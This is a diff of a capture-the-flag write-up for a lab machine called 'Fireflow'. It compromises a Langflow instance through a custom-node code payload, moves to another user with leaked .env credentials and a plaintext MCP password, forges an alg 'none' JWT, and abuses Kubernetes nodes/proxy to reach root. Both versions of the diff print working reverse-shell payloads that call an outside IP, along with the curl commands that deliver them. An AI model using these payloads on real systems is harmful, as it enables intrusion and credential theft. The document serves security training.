@@ -1,47 +1,22 @@
 # Fireflow
+## Recon 
 
-## Summary
+I start by checking dev console and instantly going to network, network leaks API paths 
 
-This machine was solved by chaining several web and service-level vulnerabilities across the Langflow application, the MCP service, and the Kubernetes environment. The path was:
-
-1. Enumerate the exposed Langflow instance and identify a vulnerable public-flow execution path.
-2. Gain a reverse shell as the `www` user.
-3. Recover credentials from `/etc/langflow/.env` and pivot to the `nightfall` account.
-4. Discover an MCP service with a weak JWT implementation and exploit the `none` algorithm to escalate privileges.
-5. Abuse the Kubernetes service account and `nodes/proxy` capability to access the underlying node and retrieve the root flag.
-
----
-
-## Recon
-
-I started by opening the browser developer tools and checking the Network tab. This immediately exposed the app’s API endpoints and leaked metadata, including a `/version` route.
-
-### Inspecting the exposed service
-
-A simple request like the following revealed the Langflow version:
-
-```bash
-curl -s http://<target>/version
+Curling path /version shows a vulnerability in the langflow version by curling and exploiting public flows, once again network tab leaks this information 
+<img width="1920" height="923" alt="Screenshot From 2026-10-04 12-46-39" src="https://github.com/user-attachments/assets/857efabe-7aca-41df-9584-7cbf578f8c2a" />
+the vulnerability payload structure follows
 ```
-
-The response showed a Langflow build that was vulnerable to public flow / custom node execution abuse. The issue was also visible in the browser traffic and frontend API metadata.
-
----
-
-## Exploiting the Langflow RCE
-
-The vulnerable endpoint accepts a crafted JSON payload containing a custom node with embedded Python code. That code executes server-side and can spawn a reverse shell.
-
-The payload structure looks like this:
-
-```json
 {
   "data": {
     "nodes": [
       {
         "id": "Exploit-001",
         "type": "genericNode",
-        "position": { "x": 0, "y": 0 },
+        "position": {
+          "x": 0,
+          "y": 0
+        },
         "data": {
           "id": "Exploit-001",
           "type": "ExploitComp",
@@ -52,17 +27,26 @@ The payload structure looks like this:
                 "required": true,
                 "show": true,
                 "multiline": true,
-                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.15.149/9001 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\n"
+                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.15.149/9001 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
+                "name": "code",
+                "password": false,
+                "advanced": false,
+                "dynamic": false
               },
               "_type": "Component"
             },
             "description": "X",
-            "base_classes": ["Data"],
+            "base_classes": [
+              "Data"
+            ],
             "display_name": "ExploitComp",
             "name": "ExploitComp",
+            "frozen": false,
             "outputs": [
               {
-                "types": ["Data"],
+                "types": [
+                  "Data"
+                ],
                 "selected": "Data",
                 "name": "o",
                 "display_name": "O",
@@ -76,7 +60,9 @@ The payload structure looks like this:
                 "group_outputs": false
               }
             ],
-            "field_order": ["code"],
+            "field_order": [
+              "code"
+            ],
             "beta": false,
             "edited": false
           }
@@ -87,187 +73,96 @@ The payload structure looks like this:
   }
 }
 ```
+We place this in a file named payload.json and send it with 
+<img width="1350" height="203" alt="Screenshot From 2026-10-04 13-40-53" src="https://github.com/user-attachments/assets/e0520a34-2159-4863-96e8-2970ca29c208" />
 
-I saved this as `payload.json` and sent it to the vulnerable endpoint.
+This gives us a shell as www
 
-### Reverse shell
+## Lateral Movement
+We may now search for hidden files
+In /etc/langflow, we may find a .env file with crucial configuration info 
+<img width="1350" height="281" alt="Screenshot From 2026-10-04 13-45-51" src="https://github.com/user-attachments/assets/d383aabe-0299-47d9-9180-c4afaf720fcf" />
+We can use this information in conjunction with SSH to move laterally to  the next user, nightfall
 
-Start a listener:
-
-```bash
-nc -lvnp 9001
+Inside nightfall home folder, we find a hidden mcp configuration file
 ```
-
-Then send the payload:
-
-```bash
-curl -s -X POST http://<target>/... \
-  -H 'Content-Type: application/json' \
-  -d @payload.json
-```
-
-The Python code executed and connected back to the listener, giving a shell as the `www` user.
-
----
-
-## Lateral movement to `nightfall`
-
-Once I had access as `www`, I searched for configuration files and local secrets. A useful target was `/etc/langflow`.
-
-### Recovering service secrets
-
-```bash
-ls -la /etc/langflow
-cat /etc/langflow/.env
-```
-
-This exposed credentials and connection details that were then usable for a second hop.
-
-Using the recovered credentials, I connected via SSH to the next user, `nightfall`.
-
-### Finding the MCP configuration
-
-Inside `nightfall`’s home directory, I found a hidden configuration file similar to:
-
-```json
 {
-  "server": "http://10.129.154.131:30080",
-  "status_endpoint": "/api/v1/version",
-  "user": "langflow-bot",
-  "password": "Langfl0w@mcp2026!"
+"server": "http://10.129.154.131:30080",
+"status_endpoint": "/api/v1/version",
+"user": "langflow-bot",
+"password": "Langfl0w@mcp2026!"
 }
 ```
+we can use json.tool to perform more recon on the target services 
+<img width="1211" height="511" alt="Screenshot From 2026-10-04 13-52-43" src="https://github.com/user-attachments/assets/48becc30-6d8d-4c45-8cf1-020e0437cbdc" />
+interestingly, none is set as the jwt algorithm, meaning a user token is vulnerable to privilege escalation 
 
-This gave access to an internal MCP service that was likely intended for automation or tool execution.
+## token privesc
 
----
-
-## JWT privilege escalation
-
-The MCP service accepted the leaked credentials and exposed a JWT-based auth flow. Inspection showed that the JWT `alg` field was effectively allowing the `none` algorithm, which made the token forgeable.
-
-### Decoding and crafting a forged JWT
-
-I used the following Python snippet to generate a malicious token:
-
-```python
+curling the endpoint with leaked credentials, we can decode the JWT like so 
+<img width="1918" height="156" alt="Screenshot From 2026-10-04 14-05-07" src="https://github.com/user-attachments/assets/1d208a63-82e3-4803-81bf-63d88fd9c913" />
+With the following script: we abuse the none vulnerability and create a malicious JWT 
+```
 import base64, json
-
 def b64url(data):
-    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
-
-header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
-payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
+return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+header = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
+payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())
 token = f"{header}.{payload}."
 print(token)
 ```
-
-This produced a token like:
-
-```bash
-ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."
+<img width="1426" height="146" alt="Screenshot From 2026-10-04 14-08-35" src="https://github.com/user-attachments/assets/3ce8061a-a7ed-49f6-a2bc-3875c875dbeb" />
+This gives us the following JWT which we turn into a environment variable for exploitation. 
 ```
-
-This token could then be passed as a bearer token to the service, effectively escalating the user to an admin role.
-
----
-
-## Obtaining a shell as `mcp`
-
-I then created another payload to register a malicious tool with code execution on the service:
-
-```json
+ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ
+9."
+```
+We create another payload.json file, 
+```
 {
-  "name": "shell",
-  "description": "debug shell",
-  "inputSchema": {"type": "object", "properties": {}},
-  "code": "import socket, os, pty\npid = os.fork()\nif pid > 0:\n    import sys; sys.exit(0)\nos.setsid()\npid = os.fork()\nif pid > 0:\n    import sys; sys.exit(0)\ns = socket.socket()\ns.connect((\"10.10.15.149\", 9001))\n[os.dup2(s.fileno(), i) for i in (0, 1, 2)]\npty.spawn(\"/bin/sh\")"
+"name": "shell",
+"description": "debug shell",
+"inputSchema": {"type":"object","properties":{}},
+"code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n import
+sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import
+sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.15.149\",9001))\n[os.dup2(s.fileno(),
+i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
 }
 ```
-
-Upload it with the forged admin JWT:
-
-```bash
+, and we send it off like so 
+```
 curl -s -X POST http://10.129.154.131:30080/api/v1/tools \
-  -H 'Content-Type: application/json' \
-  -H "Authorization: Bearer $ADMIN_JWT" \
-  -d @payload.json
+-H 'Content-Type: application/json' \
+-H "Authorization: Bearer $ADMIN_JWT" \
+-d @payload.json
 ```
-
-Then trigger it through the MCP endpoint:
-
-```bash
+We set a listener 
+```
+nc -lvnp 9001
+```
+and set off the exploit trigger utilizing the mcp tool 
+```
 curl -s -X POST http://10.129.154.131:30080/mcp \
-  -H 'Content-Type: application/json' \
-  -H "Authorization: Bearer $ADMIN_JWT" \
-  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
+-H 'Content-Type: application/json' \
+-H "Authorization: Bearer $ADMIN_JWT" \
+-d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":
+{}}}'
 ```
+We now have a shell as user mcp.
 
-This gave a shell as the `mcp` user.
+## Privilege Escalation 
+After doing some basic reconnassaince, we can see we are in a kubernetes cluster with heavily restricted internet and executable access
 
----
+We can enumerate our environment variables, so that we may set our kubernetes token for authorization
+<img width="762" height="568" alt="Screenshot From 2026-10-04 16-07-16" src="https://github.com/user-attachments/assets/89bdce47-895d-4487-bba8-c03727d18f85" />
+<img width="1270" height="292" alt="Screenshot From 2026-10-04 16-05-36" src="https://github.com/user-attachments/assets/fe74a12b-686f-4289-b2b8-1ce7ab467f63" />
 
-## Privilege escalation to root
+Through enumerating kubernetes rules and services, we can see that we have the dangerously privileged nodes/proxy permission. This hints that hosts root filesystem is likely under /hosts/root, by following the steps in [this](https://grahamhelton.com/blog/nodes-proxy-rce) article we must find the IP and create an exploit script 
+After doing some enumeration on the API; we find our target IP for the exploit script
+<img width="1270" height="108" alt="Screenshot From 2026-10-04 16-04-32" src="https://github.com/user-attachments/assets/6af4f86d-31ec-4fc6-9192-284a3607f021" />
 
-At this point, it was clear that the `mcp` user was inside a Kubernetes environment. After basic enumeration, I found that the pod had access to service account tokens and cluster API information.
+Now that we have our script, we may create our RCE script
+<img width="991" height="806" alt="Screenshot From 2026-10-04 16-03-44" src="https://github.com/user-attachments/assets/eaf98bdf-6047-4747-839b-2db3dae39e1f" />
 
-### Enumerating the environment
-
-I checked the environment variables and service account directory:
-
-```bash
-env | sort | grep -i k8s
-ls /var/run/secrets/kubernetes.io/serviceaccount/
-cat /var/run/secrets/kubernetes.io/serviceaccount/token
-```
-
-This exposed the Kubernetes service account token and enabled a token-based API interaction.
-
-### Finding the relevant permissions
-
-I then queried the Kubernetes API and checked permissions:
-
-```bash
-kubectl auth can-i --list
-kubectl get clusterroles
-kubectl get rolebindings --all-namespaces
-```
-
-The service account had a dangerous permission set, including the ability to interact with Kubernetes node proxy functionality. This is a well-known route to reach the underlying node and read host-level files.
-
-### Exploiting the node proxy capability
-
-Using the service account token and the available API/proxy routes, I targeted the underlying node and executed commands through the cluster against the host filesystem.
-
-The general idea is:
-
-```bash
-curl -s -H "Authorization: Bearer <token>" \
-  http://<kubernetes-api-host>:<port>/api/v1/nodes/<node>/proxy/
-```
-
-From there, I could reach host paths such as `/root` and read the root-level files.
-
-### Reading the root flag
-
-I executed the host command and read the root file directly:
-
-```bash
-cat /root/root.txt
-```
-
-This returned the final flag and completed the challenge.
-
----
-
-## Final notes
-
-The attack chain was:
-
-1. Langflow version leak + custom node RCE → get `www` shell
-2. Recover `/etc/langflow/.env` → pivot to `nightfall`
-3. Hidden MCP service + JWT `none` algorithm → escalate to admin
-4. Custom tool execution → get `mcp` shell
-5. Kubernetes service account + node proxy permissions → root access
-
-This was a multi-stage chain where weak application controls and insecure cluster permissions combined to produce full compromise.
+I now read root flag by calling the script with parameters ```('cat hosts/root/root/root.txt')```
+<img width="991" height="101" alt="Screenshot From 2026-10-04 16-03-16" src="https://github.com/user-attachments/assets/7916bfd9-f480-4012-9b47-7461e7360d22" />
